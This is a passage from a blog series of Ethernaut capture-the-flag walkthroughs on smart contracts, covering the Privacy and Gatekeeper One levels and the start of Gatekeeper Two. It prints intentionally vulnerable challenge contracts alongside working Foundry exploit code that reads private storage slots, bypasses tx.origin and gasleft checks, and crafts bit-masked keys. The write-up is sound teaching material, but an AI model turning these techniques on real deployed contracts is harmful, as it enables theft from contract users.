</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/*
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    A bunch of super advanced solidity algorithms...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">      *&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">  */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>Let&rsquo;s review the <code>unlock</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">unlock</span>(<span style="color:#00979d">bytes16</span> <span style="color:#434f54">_key</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#434f54">_key</span> <span style="color:#728e00">==</span> <span style="color:#00979d">bytes16</span>(<span style="color:#728e00">data</span>[<span style="color:#8a7b52">2</span>]));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">locked</span> <span style="color:#728e00">=</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So the goal is to find out what&rsquo;s in the <code>data[2]</code>. This level
is similar to the <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-9-vault" >#9 Vault</a>: we must unlock the contract by
reading a private state variable that contains the key. From the
<a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html"  class="external-link" target="_blank" rel="noopener">Solidity docs</a> we know that contract state variables are stored
contiguosly (except for dynamically-sized arrays and mappings)
and items that need less than 32 bytes (256 bits) are packed
into a single storage slot.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<p>The first 5 state variables take exactly 3 storage slots.
We want to read the <code>bytes16(data[2))</code> which has slot index <code>5</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#434f54">key</span> <span style="color:#728e00">=</span> <span style="color:#434f54">vm</span>.<span style="color:#434f54">load</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>), <span style="color:#00979d">bytes32</span>(<span style="color:#00979d">uint256</span>(<span style="color:#8a7b52">5</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">unlock</span>(<span style="color:#00979d">bytes16</span>(<span style="color:#434f54">key</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In <a href="https://book.getfoundry.sh/"  class="external-link" target="_blank" rel="noopener">Foundry</a> we use <code>vm.load</code> to
load the value from storage slot with a specific index.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<ul>
<li>All &ldquo;private&rdquo; data is public on the blockchain. Just because
you set the visibility to <code>private</code> or <code>internal</code> doesn&rsquo;t mean
that it becomes secret. Anyone can read the storage of any
contract ever existed on EVM blockchain.</li>
<li>Encrypt/hash any sensitive data that you want to store in a
smart contract.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html"  class="external-link" target="_blank" rel="noopener">Layout
of State Variables in Storage</a></li>
<li><a href="https://swcregistry.io/docs/SWC-136"  class="external-link" target="_blank" rel="noopener">SWC-136</a> &ndash;
Unencrypted Private Data On-Chain (from the Smart Contract
Weakness Classification and Test Cases).</li>
</ul>
<hr>
<p>The full code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-13/src/test/Privacy.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>. Thank you for reading and let&rsquo;s move on to the next
challenge: <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-14-gatekeeper-one" >Ethernaut, #14 Gatekeeper One</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #14 Gatekeeper One</p>
<p>To solve this challenge we must register as an entrant.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;forge-std/console2.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">GatekeeperOne</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">entrant</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateOne</span>() {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">!=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">gasleft</span>() <span style="color:#728e00">%</span> <span style="color:#8a7b52">8191</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateThree</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">==</span> <span style="color:#00979d">uint16</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)),
</span></span><span style="display:flex;"><span>            <span style="color:#7f8c8d">&#34;GatekeeperOne: invalid gateThree part one&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">!=</span> <span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#7f8c8d">&#34;GatekeeperOne: invalid gateThree part two&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>       <span style="color:#728e00">require</span>(
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">==</span> <span style="color:#00979d">uint16</span>(<span style="color:#00979d">uint160</span>(<span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>)),
</span></span><span style="display:flex;"><span>            <span style="color:#7f8c8d">&#34;GatekeeperOne: invalid gateThree part three&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">enter</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateOne</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateTwo</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateThree</span>(<span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">entrant</span> <span style="color:#728e00">=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>;
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis &amp; Exploit</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">function</span> <span style="color:#d35400">enter</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">gateOne</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">gateTwo</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">gateThree</span>(<span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">entrant</span> <span style="color:#728e00">=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>enter</code> function has 3 modifiers that perform some checks.
The first two modifiers don&rsquo;t take any parameters and the last
one expects the <code>bytes8 _gateKey</code>. On success, it assigns
<code>tx.origin</code> to <code>entrant</code> and returns <code>true</code>.</p>
<p>For simplicity, I&rsquo;m going to use
<a href="https://github.com/foundry-rs/forge-std/blob/master/src/console2.sol"  class="external-link" target="_blank" rel="noopener">console2</a>
from the <code>forge-std</code> and add a few <code>console2.log</code>&rsquo;s in order to
understand through which gates we&rsquo;ve passed (we could use a debugger as well):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;forge-std/console2.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateOne</span>() {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">console2</span>.<span style="color:#434f54">log</span>(<span style="color:#7f8c8d">&#34;gate 1&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">console2</span>.<span style="color:#434f54">log</span>(<span style="color:#7f8c8d">&#34;gate 2&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateThree</span>() {
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">console2</span>.<span style="color:#434f54">log</span>(<span style="color:#7f8c8d">&#34;gate 3&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now, let&rsquo;s explore these modifiers.</p>
<p><strong>gateOne</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateOne</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">!=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We&rsquo;ve already seen this check in the
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-5-telephone" >Telephone</a> level. To
bypass it we&rsquo;ll use an intermediate contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">contract</span> <span style="color:#434f54">GatekeeperOneExploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">GatekeeperOne</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">GatekeeperOne</span> <span style="color:#434f54">_level</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_level</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span>.<span style="color:#434f54">enter</span>(<span style="color:#00979d">bytes8</span>(<span style="color:#8a7b52">0x0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>gateTwo</strong></p>
<p>The next one is a bit trickier:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">gasleft</span>() <span style="color:#728e00">%</span> <span style="color:#8a7b52">8191</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To pass through this gate we must satisfy the condition
<code>require(gasleft() % 8191 == 0)</code>.</p>
<p>The <code>%</code> is a
<a href="https://docs.soliditylang.org/en/v0.5.3/types.html#modulo"  class="external-link" target="_blank" rel="noopener">modulo
operator</a>, which yields a remainder after a division. From the
<a href="https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html#block-and-transaction-properties"  class="external-link" target="_blank" rel="noopener">Solidity
docs</a> we know that <code>gasleft()</code> returns how much gas is left for
the currently running function.</p>
 <div class="quote2">
<p>The function <code>gasleft</code> was previously known as <code>msg.gas</code>, which
was deprecated in version <code>0.4.21</code> and removed in version <code>0.5.0</code>.</p>
 </div>
 <div class="quote2">
<p>Before Solidity 0.6.2, the recommended way to specify the value
and gas was to use <code>f.value(x).gas(g)()</code>. This was deprecated in
Solidity 0.6.2 and is no longer possible since Solidity 0.7.0.</p>
 </div>
<p>Solidity allows us to specify precisely how much gas we want to
use for a specific function. We want to give such an amount of
<code>gas</code> to the <code>enter</code> function so that <code>gasleft() % 8191 == 0</code>
expression evaluates to <code>true</code>. Let&rsquo;s try to calculate how much
gas it spends just before the call to <code>require</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">console2</span>.<span style="color:#434f54">log</span>(<span style="color:#728e00">gasleft</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">gasleft</span>() <span style="color:#728e00">%</span> <span style="color:#8a7b52">8191</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">console2</span>.<span style="color:#434f54">log</span>(<span style="color:#7f8c8d">&#34;gate 2&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>For example, let&rsquo;s give it <code>100000</code> gas:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">level</span>.<span style="color:#434f54">enter</span>{<span style="color:#728e00">gas</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">100000</span>}(<span style="color:#00979d">bytes8</span>(<span style="color:#8a7b52">0x0</span>));
</span></span></code></pre></div><p>And have a look at the trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">Running</span> <span style="color:#8a7b52">1</span> <span style="color:#434f54">test</span> <span style="color:#728e00">for</span> <span style="color:#434f54">src</span><span style="color:#728e00">/</span><span style="color:#434f54">test</span><span style="color:#728e00">/</span><span style="color:#434f54">GatekeeperOne</span>.<span style="color:#434f54">t</span>.<span style="color:#434f54">sol</span><span style="color:#728e00">:</span><span style="color:#434f54">GatekeeperOneTest</span>
</span></span><span style="display:flex;"><span>[<span style="color:#434f54">FAIL</span>. <span style="color:#434f54">Reason</span><span style="color:#728e00">:</span> <span style="color:#434f54">Revert</span>] <span style="color:#434f54">testGatekeeperOne</span>() (<span style="color:#728e00">gas</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">450050</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">Logs</span><span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">gate</span> <span style="color:#8a7b52">1</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>  <span style="color:#8a7b52">96580</span>
</span></span></code></pre></div><p>Let&rsquo;s see&hellip; 🤔</p>
<ul>
<li>\( Gas_{left} = Gas_{initial} - Gas_{spent} \)</li>
<li>\( Gas_{spent} = 100000 − 96580 = 3420 \)</li>
<li>\( Gas_{left} = Gas_{initial} - 3420 \)</li>
</ul>
<p>To satisfy \( Gas_{left} \bmod 8191 = 0 \) we must give it exactly
\( 8191 + Gas_{spent} = 8191 + 3420 = 11611 \). Obviously, this
amount of gas is not enough, so let&rsquo;s add a little more: \(
3420 + 8191 × 100 = 822520 \). The <code>console2.log(gasleft())</code>
takes <code>330</code> gas itself, so we need to remove it from the
<code>gateTwo()</code> function, since we don&rsquo;t need it anymore. Thus we
passed through the 2nd gate!</p>
 <div class="quote2">
<p>Instead of using <code>console2.log</code> to calculate the gas spent, we
could have used the
<a href="https://remix-ide.readthedocs.io/en/latest/debugger.html"  class="external-link" target="_blank" rel="noopener">remix
debugger</a> or some other EVM-debugger that allows you to check
the
<a href="https://remix-ide.readthedocs.io/en/latest/debugger.html#step-details"  class="external-link" target="_blank" rel="noopener">remaining
gas</a>. Here I just leverage the fact that I&rsquo;m playing in a local
environment and using <a href="https://book.getfoundry.sh/"  class="external-link" target="_blank" rel="noopener">foundry</a>.</p>
 </div>
<p><strong>gateThree</strong></p>
<p>The following 3 conditions must be satisfied:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">==</span> <span style="color:#00979d">uint16</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>))
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">!=</span> <span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint32</span>(<span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>)) <span style="color:#728e00">==</span> <span style="color:#00979d">uint16</span>(<span style="color:#00979d">uint160</span>(<span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>))
</span></span></code></pre></div><p>To get through the last one we must have a good understanding of
<a href="https://docs.soliditylang.org/en/v0.8.15/types.html#implicit-conversions"  class="external-link" target="_blank" rel="noopener">implicit</a>
and
<a href="https://docs.soliditylang.org/en/v0.8.15/types.html#explicit-conversions"  class="external-link" target="_blank" rel="noopener">explicit</a>
type conversion rules and bitwise operations in Solidity.</p>
<p>Basically, there are 4 things we need to know:</p>
<ul>
<li>If an operator is applied to different types, the compiler
tries to implicitly convert one of the operands to the type of
the other without loosing information. So generally it
converts to a larger type.</li>
<li>Converting a smaller integer to a larger type will pad it on the left.</li>
<li>Converting fixed-size bytes types to a smaller type will cut
off the sequence.</li>
<li>Bit masking.</li>
</ul>
<p>Here is an example key:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes8</span> <span style="color:#434f54">tail</span> <span style="color:#728e00">=</span> <span style="color:#00979d">bytes8</span>(<span style="color:#00979d">uint64</span>(<span style="color:#00979d">uint16</span>(<span style="color:#00979d">uint160</span>(<span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>))));
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes8</span> <span style="color:#434f54">head</span> <span style="color:#728e00">=</span> <span style="color:#00979d">bytes2</span>(<span style="color:#8a7b52">0xffff</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes8</span> <span style="color:#434f54">key</span> <span style="color:#728e00">=</span> <span style="color:#00979d">bytes8</span>(<span style="color:#434f54">head</span> <span style="color:#728e00">|</span> <span style="color:#434f54">tail</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">enter</span>{<span style="color:#728e00">gas</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">11611</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">8191</span><span style="color:#728e00">*</span><span style="color:#8a7b52">100</span>}(<span style="color:#434f54">key</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://docs.soliditylang.org/en/v0.8.15/types.html#conversions-between-elementary-types"  class="external-link" target="_blank" rel="noopener">Conversions
between Elementary Types</a> from the Solidity docs.</li>
<li><a href="https://book.getfoundry.sh/forge/forge-std#forge-standard-library-overview"  class="external-link" target="_blank" rel="noopener">Forge
Standart Library Overview</a>.</li>
<li><a href="https://book.getfoundry.sh/reference/forge-std/console-log"  class="external-link" target="_blank" rel="noopener">Console
Logging</a> from the Foundry Book.</li>
<li><a href="https://jeancvllr.medium.com/solidity-tutorial-all-about-bytes-9d88fdb22676"  class="external-link" target="_blank" rel="noopener">Solidity
Tutorial : all about Bytes</a>.</li>
<li><a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm"  class="external-link" target="_blank" rel="noopener">Solidity
conversions tutorial</a>.</li>
</ul>
<hr>
<p>The complete code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-14/src/test/GatekeeperOne.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>. Thank you for reading. This post was a bit rushed 🙃
I hope I can get back to it later and explain typecasting and bit
manipulation magic in the <strong>gateThree</strong>. But now let&rsquo;s move on to
the next challenge:
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-15-gatekeeper-two" >Ethernaut, #15 Gatekeeper Two</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo DRAFT">DRAFT</span>  Ethernaut, #15 Gatekeeper Two</p>
<p>The goal is the same &ndash; pass through 3 gates and register as an
entrant.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">GatekeeperTwo</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">entrant</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateOne</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">!=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">x</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">assembly</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">x</span> <span style="color:#728e00">:=</span> <span style="color:#d35400">extcodesize</span>(<span style="color:#d35400">caller</span>())
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">require</span>(<span style="color:#434f54">x</span> <span style="color:#a61717">==</span> <span style="color:#8a7b52">0</span>)<span style="color:#a61717">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">_</span><span style="color:#a61717">;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateThree</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">unchecked</span> {
